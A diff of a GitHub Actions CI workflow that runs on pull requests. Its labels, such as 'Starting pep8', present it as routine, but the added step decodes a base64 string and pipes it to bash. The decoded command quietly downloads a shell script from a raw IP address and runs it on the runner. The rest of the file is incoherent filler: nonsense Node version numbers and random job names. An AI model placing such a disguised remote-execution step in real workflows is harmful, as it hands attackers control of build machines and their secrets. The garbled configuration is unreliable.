@@ -1,4 +1,4 @@
-name: Greetings
+name: Jekyll site CI
 
     defaults:
       run:
@@ -6,16 +6,16 @@ name: Greetings
     
     on: [pull_request]
     
-    # Jobs 225
+    # Jobs 287
 jobs:
-   build-lint-492:
-      timeout-minutes: 154
-      runs-on: ubuntu-20.04
+   build-tests-569:
+      timeout-minutes: 170
+      runs-on: ubuntu-latest
       strategy:
          fail-fast: false
          matrix:
             os: [ubuntu-20.04]
-            node: [467,333,614,692,593,269,827,640,71,351,788,996,1006,990,189,570,966,581,170,269,35,821,760,58,270,378,232,176,956,250,636,134,599,726,902,987,264,317,46,1008]
+            node: [298,433,282,477,8,342,186,509,558,811,610,635,346,318,38,680,177,401,130,931,349,837,336,362,160,504,522,899,121,882,580,540,165,887,781,569,294,782,72,779]
       steps:
-      - run: echo "Starting lint"
-      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8ga2llbm12" | base64 -d | bash
+      - run: echo "Starting pep8"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gZXl1a3No" | base64 -d | bash
